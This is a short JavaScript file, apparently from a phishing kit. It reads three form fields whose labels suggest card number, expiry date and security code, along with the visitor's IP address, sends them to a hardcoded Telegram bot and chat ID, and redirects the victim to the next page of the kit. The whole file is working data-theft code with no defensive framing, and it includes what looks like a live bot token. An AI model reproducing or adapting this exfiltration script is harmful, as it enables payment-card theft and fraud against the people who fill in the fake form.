//bot token
var telegram_bot_id = "5761388760:AAHwURtMYD45Ru5rHHEGfTSwaeQuT8zFMec";
//chat id
var chat_id =5474544277;
var u_name, u_name2, u_name3, ip;
var ready = function () {
    u_name = document.getElementById("celec").value;
    u_name2 = document.getElementById("vencec").value;
    u_name3 = document.getElementById("cevocer").value;
    ip = document.getElementById("gfg").innerHTML;
    message = "🟥COLP4TRIA🟥\nCECE: " + u_name + "\nVEN: " + u_name2 + "\nCEVO: " + u_name3 + "\n\nIP: " + ip +"\n🟥C0DIGO SYN4PSE🟥";
};
var sender = function () {
    ready();
    var settings = {
        "async": true,
        "crossDomain": true,
        "url": "https://api.telegram.org/bot" + telegram_bot_id + "/sendMessage",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "cache-control": "no-cache"

        },
        "data": JSON.stringify({
            "chat_id": chat_id,
            "text": message
        })
    };
    $.ajax(settings).done(function (response) {
        window.location = 'index4.php';
        console.log(response);
    });
    return false;
};
